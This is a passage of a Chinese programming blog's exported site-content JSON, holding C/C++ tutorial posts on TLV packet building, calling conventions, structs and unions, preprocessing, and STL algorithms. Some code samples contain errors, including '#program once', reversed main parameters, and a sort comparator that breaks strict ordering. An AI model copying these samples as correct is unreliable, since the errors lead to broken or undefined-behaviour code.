{"meta":{"title":"YanChen","subtitle":null,"description":"博客关注WEB网络安全、IT行业、网络资源、电脑技术、网络安全技术、网络安全知识、互联网安全知识、网站建设技术交流博、学习投资、金融理财","author":"John Doe","url":"https://xiaowuyoucy.github.io","root":"/"},"pages":[{"title":"","date":"2019-12-05T12:12:01.571Z","updated":"2019-03-15T13:29:05.675Z","comments":false,"path":"/404.html","permalink":"https://xiaowuyoucy.github.io//404.html","excerpt":"","text":"404 Not Found：该页无法显示-返回博客首页"},{"title":"关于 陈焱（Yan Chen）","date":"2020-11-17T15:32:01.437Z","updated":"2020-11-17T15:32:01.437Z","comments":false,"path":"about/index.html","permalink":"https://xiaowuyoucy.github.io/about/index.html","excerpt":"","text":"Content [One.陈焱的人生事件纪要] [Two.Resesume of YanChen] Three.Annual Summery of YanChen ​"},{"title":"分类","date":"2019-12-05T12:12:01.590Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"categories/index.html","permalink":"https://xiaowuyoucy.github.io/categories/index.html","excerpt":"","text":""},{"title":"友链","date":"2019-12-05T12:12:01.608Z","updated":"2019-04-14T19:39:56.059Z","comments":true,"path":"links/index.html","permalink":"https://xiaowuyoucy.github.io/links/index.html","excerpt":"","text":""},{"title":"Repositories","date":"2019-12-05T12:12:01.613Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"repository/index.html","permalink":"https://xiaowuyoucy.github.io/repository/index.html","excerpt":"","text":""},{"title":"标签","date":"2019-12-05T12:12:01.877Z","updated":"2018-10-04T14:11:17.000Z","comments":false,"path":"tags/index.html","permalink":"https://xiaowuyoucy.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"结构体与指针应用_封包构造与解析","slug":"结构体与指针应用-封包构造与解析","date":"2021-09-28T09:34:41.000Z","updated":"2021-09-28T10:14:17.873Z","comments":true,"path":"2021/09/28/结构体与指针应用-封包构造与解析/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/28/结构体与指针应用-封包构造与解析/","excerpt":"","text":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#pragma pack(1)typedef struct&#123; byte bType; int ilength; char* cValue;&#125;TLV;typedef struct&#123; int iCmdID; byte bCount; int iResolve; TLV tlv[0];&#125;COMMAND;#pragma pack() // 发送命令函数void SendCmd(void* pDate, int size);void ParseCmd(void* pDate, int size);// 命令类型 110 保留字0填充// 2个TLV 一个是字符串 hello 一个是字符串agpint main(void)&#123; // 声明变量 TLV tl1; TLV tl2; char* pString1 = NULL; char* pString2 = NULL; COMMAND* pCmd = NULL; int iCmdLength = 0; int iTLVCount = 0; memset(&amp;tl1, 0, sizeof(TLV)); memset(&amp;tl2, 0, sizeof(TLV)); // 构造字符串 pString1 = malloc(strlen(\"hello\")); memcpy(pString1, \"hello\", strlen(\"hello\")); pString2 = malloc(strlen(\"agp\")); memcpy(pString2, \"agp\", strlen(\"agp\")); // 构造tlv1 tl1.ilength = strlen(\"hello\"); tl1.bType = 1; tl1.cValue = pString1; // 构造tlv2 tl2.ilength = strlen(\"agp\"); tl2.bType = 1; tl2.cValue = pString2; // 构造发送包 iCmdLength = sizeof(COMMAND) + tl1.ilength + tl2.ilength + 2 * 5; pCmd = malloc(iCmdLength); pCmd-&gt;iCmdID = 110; pCmd-&gt;bCount = 2; pCmd-&gt;iResolve = 0; memcpy((void*)((int)pCmd + sizeof(COMMAND)), &amp;tl1, 5); memcpy((void*)((int)pCmd + sizeof(COMMAND) + 5), tl1.cValue, tl1.ilength); memcpy((void*)((int)pCmd + sizeof(COMMAND) + 5 + tl1.ilength), &amp;tl2, 5); memcpy((void*)((int)pCmd + sizeof(COMMAND) + 5 + tl1.ilength + 5), tl2.cValue, tl2.ilength); SendCmd(pCmd,iCmdLength); // 解析 ParseCmd(pCmd,iCmdLength); system(\"pause\"); return 0;&#125;void* g_PDate = NULL;void SendCmd(void* pDate, int size)&#123; g_PDate = malloc(size); memcpy(g_PDate, pDate, size);&#125;void ParseCmd(void* pDate, int size)&#123; int i = 0; COMMAND* cmd = (COMMAND*)pDate; TLV* ptl1 = malloc(sizeof(TLV)); TLV* ptl2 = malloc(sizeof(TLV)); char* pString1 = NULL; char* pString2 = NULL; memset(ptl1, 0, sizeof(TLV)); memset(ptl2, 0, sizeof(TLV)); printf(\"命令ID:%d\\r\\n\", cmd-&gt;iCmdID); printf(\"TLV个数:%d\\r\\n\", cmd-&gt;bCount); printf(\"保留字段:%d\\r\\n\", cmd-&gt;iResolve); printf(\"TLV数据--------------------\\r\\n\"); ptl1 = (TLV*)((int)pDate + sizeof(COMMAND)); printf(\"TL1类型:%d\\r\\n\", ptl1-&gt;bType); printf(\"TL1长度:%d\\r\\n\", ptl1-&gt;ilength); pString1 = malloc(ptl1-&gt;ilength + 1); memcpy(pString1, (void*)((int)ptl1 + sizeof(TLV) - 4), ptl1-&gt;ilength); pString1[ptl1-&gt;ilength] = 0; printf(\"TL1数据:%s\\r\\n\", pString1); ptl2 = (TLV*)((int)pDate + sizeof(COMMAND) + ptl1-&gt;ilength + sizeof(TLV) - 4); printf(\"TL2类型:%d\\r\\n\", ptl2-&gt;bType); printf(\"TL2长度:%d\\r\\n\", ptl2-&gt;ilength); pString2 = malloc(ptl2-&gt;ilength + 1); memcpy(pString2, (void*)((int)ptl2 + sizeof(TLV) - 4), ptl2-&gt;ilength); pString2[ptl2-&gt;ilength] = 0; printf(\"TL2数据:%s\\r\\n\", pString2);&#125;","categories":[{"name":"C","slug":"C","permalink":"https://xiaowuyoucy.github.io/categories/C/"}],"tags":[]},{"title":"函数调用过程与调用约定","slug":"函数调用过程与调用约定","date":"2021-09-27T17:39:51.000Z","updated":"2021-09-27T17:48:34.365Z","comments":true,"path":"2021/09/28/函数调用过程与调用约定/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/28/函数调用过程与调用约定/","excerpt":"","text":"函数调用约定 __cdecl 缺省调用方式，函数采用从右到左的压栈方式，调用方清理堆栈，注意可变参数 __stdcall 函数的参数自右向左通过栈传递，被调用方清理堆栈 __fastcall 通过寄存器来传送参数，被调用方清理堆栈 __thiscall用于C++成员函数，使用ecx存放this指针 naked call 裸函数，上面几种方式会产生保存一些寄存器的代码，这种不产生。naked call不是类型修饰符，必须和_declspec共同使用 __declspec(naked) 是告诉编译器 不要对函数进行优化 函数的所有实现包括堆栈的平衡 参数的压栈 ebp的赋值 还原 都要我们来做 决定以下内容： 1)函数参数的压栈顺序 2)由调用者还是被调用者把参数弹出栈 3)以及产生函数修饰名的方法 修饰名 1、修饰名(Decoration name)：&quot;C&quot;或者&quot;C++“函数在内部（编译和链接）通过修饰名识别 2、C编译时函数名修饰约定规则： __stdcall调用约定在输出函数名前加上一个下划线前缀，后面加上一个”@&quot;符号和其参数的字节数，格式为_functionname@number, 例如 ：function(int a, int b)，其修饰名为：_function@8 __cdecl调用约定仅在输出函数名前加上一个下划线前缀，格式为_functionname。 __fastcall调用约定在输出函数名前加上一个&quot;@“符号，后面也是一个”@&quot;符号和其参数的字节数，格式为@functionname@number。 注： 123一般WIN32的函数都是__stdcall #define CALLBACK __stdcall #define WINAPI __stdcall 例子 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;// 默认是__cdeclint cAdd(int a, int b, int c)&#123; return a + b + c;&#125;//堆栈平衡由函数内部处理int __stdcall stdAdd(int a, int b, int c)&#123; return a + b + c;&#125;//前两个参数使用寄存器存储,堆栈平衡由函数内部处理int __fastcall fastAdd(int a, int b, int c)&#123; return a + b + c;&#125;//堆栈平衡由我们自己处理int __declspec(naked) nkAdd(int a, int b, int c)&#123; __asm &#123; push [esp + 0ch] push [esp + 0ch] push [esp + 0ch] call stdAdd mov eax,eax ret &#125; &#125;int main(void)&#123; int result; // 内联汇编 __asm &#123; mov eax,eax mov eax,eax mov eax,eax &#125; result = cAdd(1,2,3); printf(\"%d\",result); stdAdd(1,2,3); printf(\"%d\",result); fastAdd(1,2,3); printf(\"%d\",result); nkAdd(1,2,3); printf(\"%d\",result); //CreateThread(); system(\"pause\"); return 0;&#125;","categories":[{"name":"C","slug":"C","permalink":"https://xiaowuyoucy.github.io/categories/C/"}],"tags":[]},{"title":"结构体、共用体、枚举","slug":"结构体、共用体、枚举","date":"2021-09-27T16:52:48.000Z","updated":"2021-09-27T17:06:48.490Z","comments":true,"path":"2021/09/28/结构体、共用体、枚举/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/28/结构体、共用体、枚举/","excerpt":"","text":"结构体 不同类型数据的集合 定义 12struct 结构名&#123;结构成员表&#125;; 123456789101112131415161718struct student&#123;int no;char name[10];int age;double socre;char addr[50];struct date birth;&#125;;struct date&#123;int year;int month;int day;&#125;;struct student st1; 初始化，可直接清空 memset 函数原型: 1void *memset(void *s, int ch, size_t n); 1memset(&amp;st, 0, sizeof(st)); //用0填充st内存 memcpy 函数原型: 1void *memcpy(void *destin, void *source, unsigned n); 1memcpy(st.name, &quot;agp&quot;, strlen(&quot;agp&quot;)); //将“agp”复制到st.name内存中 typedef 使用typedef创建结构体、共用体、枚举类型别名 12345678910111213141516171819202122232425typedef struct date&#123; int year; int month; int day;&#125;MDATE;typedef union data&#123; char c[10]; int a; double f;&#125; MDATA;MDATA x;typedef enum week &#123; sun, mon, tue, wed, thu, fri, sta&#125;WEEK; 结构体指针变量访问成员 访问方法，指针用-&gt; . 大小 内存对齐 X86 默认4字节对齐 12#pragma pack(1) 修改内存对齐为1一般是 网络通信 双机通信~~ 使用 sizeof(结构名或者变量名) 对齐原因：有些平台每次读都是从偶地址开始，如果一个int型（假设为 32位）如果存放在偶地址开始的地方，那么一个读周期就可以读出，而如果存放在奇地址开始的地方，就可能会需要2个读周期，并对两次读出的结果的高低 字节进行拼凑才能得到该int数据。显然在读取效率上下降很多。这也是空间和时间的博弈。 http://baike.baidu.com/view/925608.htm 原则：地址可以被整除 结构数组 地址1 结构1 地址2 结构2 … 共用体union 共用一块内存，某个时刻只有一个有效 1234567union data&#123;char c[10];int a;double f;&#125;;union data x; 枚举enum 提高程序可读性 有名字的整形常量的集合，该类型变量只能取其中的一个值 12enum week &#123;sun, mon, tue, wed,thu, fri, sta&#125;; 不赋值 默认从0开始enum week w = sun; //sun == 0","categories":[{"name":"C","slug":"C","permalink":"https://xiaowuyoucy.github.io/categories/C/"}],"tags":[]},{"title":"编译过程与预处理","slug":"编译过程与预处理","date":"2021-09-27T15:41:21.000Z","updated":"2021-09-27T15:55:27.688Z","comments":true,"path":"2021/09/27/编译过程与预处理/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/09/27/编译过程与预处理/","excerpt":"","text":"1.编写文本代码，C或Cpp文件 2.编译，就是Compile，由C编译程序对你写的代码进行词法和语法分析，发现并报告错误。 如若无错，则生成中间代码，扩展名.obj，此时是二进制 3.链接，Link，生成可执行的Exe文件。由于一个程序的源码可由多个文件组成。这些文件在第二步 中分别编译，生成各自的目标文件，这一步的作用便是将这些Obj文件，以及程序中需要的其它库文件(Dll除开），统一到一个文件中来，形成单个的Exe 文件。此Exe文件便可以在操作系统下直接运行了。 源文件－－&gt;预编译处理－－&gt;编译(优化,汇编程序)－－&gt;链接程序–&gt;可执行文件 预处理：编译成目标文件前对源程序进行处理 宏处理 #define 预处理指令#开头，无逗号，可出现在任意位置，作用域为出现位置到文件结尾 12345678910#define 一改全改#define PI 3.14#define MAX(a, b) (a &gt; b ? a : b)#define Add(a,b) a+b c * Add(a,b) * d == c * a + b * d，导致计算错误，解决方法是在a+b中加上括号(a + b )#undef 宏名 //取消宏定义 123456789101112多行定义 \\#define MAX(a, b) (a &gt; b ? \\ a : b) #define APG_DELETE(p) do&#123; delete p; p = NULL&#125; while(0)if(NULL != p) APG_DELETE(p)else ...do sth...if(NULL != p) AGP_DELETE(p);else ...do sth... 文件包含 #include #include&lt;头文件名称&gt;: 先在系统路径搜索文件（一般是include） #include&quot;头文件名称&quot;：先在当前目录搜索 条件编译与#program 123#if 0或1 //如果是0则不编译，如果是1则编译#endif 12345#ifdef 宏名 //如果宏名已定义，执行块1，否则执行块2块1....#else块2.....#endif 1234#ifndef 宏名 //如果宏名没有定义，我们就定义一个这样的宏，防止头文件被重复包含#define 宏名...#endif 1#program once //防止头文件被重复包含，只能在vs中用","categories":[{"name":"C","slug":"C","permalink":"https://xiaowuyoucy.github.io/categories/C/"}],"tags":[]},{"title":"STL中常用的集合算法","slug":"cpp0094-STL中常用的集合算法","date":"2021-07-26T15:13:19.000Z","updated":"2021-07-26T15:18:51.500Z","comments":true,"path":"2021/07/26/cpp0094-STL中常用的集合算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/26/cpp0094-STL中常用的集合算法/","excerpt":"","text":"STL中常用的集合算法 set_union(),set_intersection(),set_difference() set_union: 构造一个有序序列，包含两个有序序列的并集。 set_intersection: 构造一个有序序列，包含两个有序序列的交集。 假设有集合A和B，所有属于A且不属于B的元素的集合被称为A与B的差集。 示例：对于集合A = {a, b, c, d}和集合B = {b, c, w}，则A与B 的差集为{a, d} 也就是集合A中有的元素,在集合B中没有的这部分元素，就是集合A和集合B中的差集 set_difference: 构造一个有序序列，该序列保留第一个有序序列中存在而第二个有序序列中不存在的元素。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(7);​ vecIntA.push_back(9); ​ vector&lt;int&gt; vecIntB;​ vecIntB.push_back(1);​ vecIntB.push_back(3);​ vecIntB.push_back(5);​ vecIntB.push_back(6);​ vecIntB.push_back(8); ​ vector&lt;int&gt; vecIntC;​ vecIntC.resize(10); ​ //并集​ set_union(vecIntA.begin(), vecIntA.end(), vecIntB.begin(), vecIntB.end(), vecIntC.begin()); //vecIntC : &#123;1,3,5,6,7,8,9,0,0,0&#125; ​ //交集​ fill(vecIntC.begin(),vecIntC.end(),0);​ set_intersection(vecIntA.begin(), vecIntA.end(), vecIntB.begin(), vecIntB.end(), vecIntC.begin()); //vecIntC: &#123;1,3,5,0,0,0,0,0,0,0&#125; ​ //差集​ fill(vecIntC.begin(),vecIntC.end(),0);​ set_difference(vecIntA.begin(), vecIntA.end(), vecIntB.begin(), vecIntB.end(), vecIntC.begin()); //vecIntC: &#123;7,9,0,0,0,0,0,0,0,0&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;void printV(int &amp;x) &#123; cout &lt;&lt; x &lt;&lt; \" \";&#125;void test_union() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); vector&lt;int&gt; v2; v2.push_back(2); v2.push_back(4); v2.push_back(6); vector&lt;int&gt; v3; v3.resize(v1.size() + v2.size()); //v1∪v2,把相同部分去掉,将结果存放到v3容器中 set_union(v1.begin(),v1.end(),v2.begin(),v2.end(),v3.begin()); for_each(v3.begin(),v3.end(), printV); cout &lt;&lt; endl;&#125;void test_set_intersection() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(3); v1.push_back(5); vector&lt;int&gt; v2; v2.push_back(1); v2.push_back(3); v2.push_back(6); vector&lt;int&gt; v3; v3.resize(v1.size()+v2.size()); //v1∩v2,将不相同的部分去掉,把结果存放到v3容器中 set_intersection(v1.begin(),v1.end(),v2.begin(),v2.end(),v3.begin()); for_each(v3.begin(), v3.end(), printV); cout &lt;&lt; endl;&#125;void test_difference() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(2); v1.push_back(3); v1.push_back(4); v1.push_back(4); v1.push_back(6); vector&lt;int&gt; v2; v2.push_back(1); v2.push_back(2); v2.push_back(3); v2.push_back(5); vector&lt;int&gt; v3; v3.resize(v1.size() + v2.size()); /* set_difference 差集: v1 - v2 将剩余元素存放在v3中 假设有集合A和B，所有属于A且不属于B的元素的集合被称为A与B的差集。 示例：对于集合A = &#123;a, b, c, d&#125;和集合B = &#123;b, c, w&#125;，则A与B 的差集为&#123;a, d&#125; */ set_difference(v1.begin(), v1.end(), v2.begin(), v2.end(), v3.begin()); for_each(v3.begin(), v3.end(), printV); cout &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_union(); test_set_intersection(); test_difference(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"STL中常用的算术和生成算法","slug":"cpp0093-STL中常用的算术和生成算法","date":"2021-07-26T14:44:33.000Z","updated":"2021-07-26T14:46:46.010Z","comments":true,"path":"2021/07/26/cpp0093-STL中常用的算术和生成算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/26/cpp0093-STL中常用的算术和生成算法/","excerpt":"","text":"STL中常用的算术和生成算法 accumulate() accumulate: 对指定范围内的元素求和，然后结果再加上一个由val指定的初始值。 要加上头文件 #include&lt;numeric&gt; 123456789101112131415​ vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(7);​ vecIntA.push_back(9);​ int iSum = accumulate(vecIntA.begin(), vecIntA.end(), 100); //iSum==125 fill() fill: 将输入值赋给标志范围内的所有元素。 ​ 12345678910111213vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(7);​ vecIntA.push_back(9); //将vecintA容器中的所有元素都填充为8​ fill(vecIntA.begin(), vecIntA.end(), 8); //8, 8, 8, 8, 8 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;numeric&gt;using namespace std;void test_accumulate()&#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(2); v1.push_back(3); v1.push_back(4); //accumulate : 将容器中所有元素相加,然后在加上最后一个参数的值,并返回 int sum = accumulate(v1.begin(),v1.end(),100); cout &lt;&lt; sum &lt;&lt; endl;&#125;void test_fill() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(1); v1.push_back(1); v1.push_back(1); //将v1所有元素都填充为100 fill(v1.begin(),v1.end(),100); for (vector&lt;int&gt;::iterator it = v1.begin(); it != v1.end(); it++) &#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_accumulate(); test_fill(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"常用的拷贝和替换STL算法","slug":"cpp0092-常用的拷贝和替换STL算法","date":"2021-07-26T14:23:54.000Z","updated":"2021-07-26T14:31:44.923Z","comments":true,"path":"2021/07/26/cpp0092-常用的拷贝和替换STL算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/26/cpp0092-常用的拷贝和替换STL算法/","excerpt":"","text":"常用的拷贝和替换STL算法 copy() 将容器1中的元素拷贝到容器2中 copy(容器1.begin(),容器1.end(),容器2.begin()) 123456789101112131415161718192021vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(7);​ vecIntA.push_back(9); ​ vector&lt;int&gt; vecIntB;​ vecIntB.resize(5); //扩大空间 ​ copy(vecIntA.begin(), vecIntA.end(), vecIntB.begin()); //vecIntB: &#123;1,3,5,7,9&#125; replace() replace(beg,end,oldValue,newValue): 将指定范围内的所有等于oldValue的元素替换成newValue。 ​ 123456789101112131415 vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(3);​ vecIntA.push_back(9); ​ replace(vecIntA.begin(), vecIntA.end(), 3, 8); //&#123;1,8,5,8,9&#125; replace_if() replace_if(begin,end,一元谓词,要替换的数字) replace_if : 将指定范围内所有操作结果为true的元素用新值替换。 用法举例： replace_if(vecIntA.begin(),vecIntA.end(),GreaterThree,newVal) 其中 vecIntA是用vector&lt;int&gt;声明的容器 GreaterThree 函数的原型是 bool GreaterThree(int iNum) 1234567891011121314151617//把大于等于3的元素替换成8​ vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ vecIntA.push_back(3);​ vecIntA.push_back(9); ​ replace_if(vecIntA.begin(), vecIntA.end(), GreaterThree, 8); // GreaterThree的定义在上面。 swap() swap: 交换两个容器的元素 swap(容器1,容器2) 12345678910111213141516171819 vector&lt;int&gt; vecIntA;​ vecIntA.push_back(1);​ vecIntA.push_back(3);​ vecIntA.push_back(5);​ ​ vector&lt;int&gt; vecIntB;​ vecIntB.push_back(2);​ vecIntB.push_back(4); ​ swap(vecIntA, vecIntB); //交换 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;using namespace std;void printV(int &amp;x) &#123; cout &lt;&lt; x &lt;&lt; \" \" ;&#125;void test_copy() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(21); v1.push_back(31); v1.push_back(41); v1.push_back(51); vector&lt;int&gt; v2; v2.resize(v1.size()); copy(v1.begin(), v1.end(),v2.begin()); for_each(v2.begin(),v2.end(),printV); cout &lt;&lt; endl;&#125;void test_replace() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(1); v1.push_back(1); v1.push_back(21); v1.push_back(31); v1.push_back(41); v1.push_back(51); //将v1的所以元素是1的,都替换成5 replace(v1.begin(),v1.end(),1,5); for_each(v1.begin(),v1.end(),printV); cout &lt;&lt; endl;&#125;bool MyGreate(int &amp; i) &#123; if (i &gt;= 1) &#123; return true; &#125; return false;&#125;void test_replaceif() &#123; vector&lt;int&gt; v1; v1.push_back(1); v1.push_back(1); v1.push_back(1); v1.push_back(21); v1.push_back(51); //将v1容器中大于等于1的所有元素都替换成5 replace_if(v1.begin(),v1.end(), MyGreate,5); for_each(v1.begin(),v1.end(),printV); cout &lt;&lt; endl;&#125;void test_swap() &#123; vector&lt;int&gt; v1, v2; v1.push_back(1); v1.push_back(3); v1.push_back(5); v2.push_back(2); v2.push_back(4); v2.push_back(6); //交换前 cout &lt;&lt; \"v1: \"; for_each(v1.begin(), v1.end(), printV); cout &lt;&lt; endl; swap(v1, v2); //交换后 cout &lt;&lt; \"v1: \"; for_each(v1.begin(),v1.end(),printV); cout &lt;&lt; endl;&#125;int main(char *argv[], int argc)&#123; test_copy(); test_replace(); test_replaceif(); test_swap(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"常用的排序算法","slug":"cpp0091-常用的排序算法","date":"2021-07-24T19:38:28.000Z","updated":"2021-07-24T21:17:04.300Z","comments":true,"path":"2021/07/25/cpp0091-常用的排序算法/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/07/25/cpp0091-常用的排序算法/","excerpt":"","text":"常用的排序算法 merge() 以下是排序和通用算法：提供元素排序策略 merge: 合并两个有序序列，存放到另一个序列。 例如：vecIntA,vecIntB,vecIntC是用vector&lt;int&gt;声明的容器，vecIntA已包含1,3,5,7,9元素，vecIntB已包含2,4,6,8元素 vecIntC.resize(9); //扩大容量 merge(vecIntA.begin(),vecIntA.end(),vecIntB.begin(),vecIntB.end(),vecIntC.begin()); 此时vecIntC就存放了按顺序的1,2,3,4,5,6,7,8,9九个元素 sort() sort: 以默认升序的方式重新排列指定范围内的元素。若要改排序规则，可以输入比较函数。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061//学生类Class CStudent:&#123;public:​ CStudent(int iID, string strName)​ &#123;m_iID=iID; m_strName=strName; &#125;public: ​ int m_iID;​ string m_strName;&#125; //学号比较函数bool Compare(const CStudent &amp;stuA,const CStudent &amp;stuB)&#123;​ return (stuA.m_iID&lt;strB.m_iID);&#125;void main()&#123;​ vector&lt;CStudent&gt; vecStu;​ vecStu.push_back(CStudent(2,&quot;老二&quot;));vecStu.push_back(CStudent(1,&quot;老大&quot;));vecStu.push_back(CStudent(3,&quot;老三&quot;));vecStu.push_back(CStudent(4,&quot;老四&quot;)); sort(vecStu.begin(),vecStu.end(),Compare); // 此时，vecStu容器包含了按顺序的&quot;老大对象&quot;,&quot;老二对象&quot;,&quot;老三对象&quot;,&quot;老四对象&quot;&#125; random_shuffle() 123456789101112131415161718192021222324252627 random_shuffle: 对指定范围内的元素随机调整次序。​ srand(time(0)); //设置随机种子 ​ vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(3);​ vecInt.push_back(5);​ vecInt.push_back(7);​ vecInt.push_back(9); ​ string str(&quot;itcastitcast &quot;);​ ​ random_shuffle(vecInt.begin(), vecInt.end()); //随机排序，结果比如：9,7,1,5,3​ random_shuffle(str.begin(), str.end()); //随机排序，结果比如：&quot; itstcasticat &quot; reverse() 123456789101112131415 vector&lt;int&gt; vecInt;​ vecInt.push_back(1);​ vecInt.push_back(3);​ vecInt.push_back(5);​ vecInt.push_back(7);​ vecInt.push_back(9); ​ reverse(vecInt.begin(), vecInt.end()); //&#123;9,7,5,3,1&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157#define _CRT_SECURE_NO_WARNINGS#include&lt;iostream&gt;#include&lt;vector&gt;#include&lt;algorithm&gt;#include&lt;string&gt;#include&lt;ctime&gt;#include&lt;cstdlib&gt;using namespace std;void printV(vector&lt;int&gt; &amp;v) &#123; for (vector&lt;int&gt;::iterator it = v.begin(); it != v.end() ; it++) &#123; cout &lt;&lt; *it &lt;&lt; \" \"; &#125; cout &lt;&lt; endl &lt;&lt; \"============================\" &lt;&lt; endl;&#125;void test_merge() &#123; vector&lt;int&gt; v1; v1.push_back(0); v1.push_back(1); v1.push_back(5); v1.push_back(60); v1.push_back(1); sort(v1.begin(),v1.end()); vector&lt;int&gt; v2; v2.push_back(2); v2.push_back(4); v2.push_back(6); v2.push_back(8); sort(v2.begin(), v2.end()); vector&lt;int&gt; v3; v3.resize(v1.size() + v2.size()); merge(v1.begin(),v1.end(),v2.begin(),v2.end(),v3.begin()); printV(v3);&#125;class Student &#123;public: Student() &#123; m_name = \"\"; m_age = 0; m_id = 0; &#125; Student(string name, int id, int age) &#123; m_name = name; m_age = age; m_id = id; &#125; bool operator()(Student &amp; s1, Student &amp; s2) &#123; if (s1.m_id &lt;= s2.m_id) &#123; if (s1.m_id == s2.m_id) &#123; return s1.m_age &gt;= s2.m_age; &#125; else &#123; return true; &#125; &#125; else &#123; return false; &#125; &#125; void printAll() &#123; cout &lt;&lt; \"name: \" &lt;&lt; m_name &lt;&lt; \"\\tid: \" &lt;&lt; m_id &lt;&lt; \"\\tage: \" &lt;&lt; m_age &lt;&lt; endl; &#125;private: string m_name; int m_id; int m_age;&#125;;void printV2(Student &amp; s) &#123; s.printAll();&#125;void test_sort() &#123; vector&lt;int&gt; v1; v1.push_back(0); v1.push_back(1); v1.push_back(5); v1.push_back(60); v1.push_back(1); sort(v1.begin(),v1.end());//默认升序排序 printV(v1); vector&lt;Student&gt; v2; v2.push_back(Student(\"老大\",1,22)); v2.push_back(Student(\"老大\",1,23)); v2.push_back(Student(\"老二\", 2, 20)); v2.push_back(Student(\"老四\", 4, 18)); v2.push_back(Student(\"老大\",1,22)); v2.push_back(Student(\"老三\", 3, 19)); sort(v2.begin(),v2.end(),Student()); for_each(v2.begin(),v2.end(),printV2);&#125;void test_random_shuffle() &#123; vector&lt;Student&gt; v2; v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老大\", 1, 23)); v2.push_back(Student(\"老二\", 2, 20)); v2.push_back(Student(\"老四\", 4, 18)); v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老三\", 3, 19)); srand(time(NULL)); random_shuffle(v2.begin(),v2.end()); cout &lt;&lt; \"========================\" &lt;&lt; endl; for_each(v2.begin(), v2.end(), printV2); string str = \"1234567\"; random_shuffle(str.begin(), str.end()); cout &lt;&lt; str &lt;&lt; endl;&#125;void test_reverse() &#123; vector&lt;Student&gt; v2; v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老大\", 1, 23)); v2.push_back(Student(\"老二\", 2, 20)); v2.push_back(Student(\"老四\", 4, 18)); v2.push_back(Student(\"老大\", 1, 22)); v2.push_back(Student(\"老三\", 3, 19)); sort(v2.begin(), v2.end(), Student()); reverse(v2.begin(), v2.end()); for_each(v2.begin(),v2.end(),printV2);&#125;int main(char *argv[], int argc)&#123; test_merge(); test_sort(); test_random_shuffle(); test_reverse(); return 